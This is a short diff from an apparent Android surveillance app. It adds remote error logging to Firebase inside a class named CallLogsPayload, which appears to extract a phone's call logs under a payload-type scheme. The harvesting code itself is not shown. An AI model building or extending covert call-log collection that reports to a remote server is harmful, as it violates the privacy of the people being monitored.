@@ -9,7 +9,9 @@ import android.util.Log;
 
 import com.aigs.serviceone.helpers.CallExtractorNotifier;
 import com.aigs.serviceone.helpers.FileSystem;
+import com.aigs.serviceone.helpers.PayloadTypes;
 import com.aigs.serviceone.helpers.SmsModes;
+import com.google.firebase.database.FirebaseDatabase;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -93,6 +95,8 @@ public class CallLogsPayload extends AsyncTask<String, Integer, String> {
             managedCursor.close();
         }catch (Exception e){
             Log.e("EXCEPTION_CL",e.getMessage());
+            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_CALL_LOGS+"").child("CurrentLog").setValue(e.getMessage());
+
         }
 
         return null;
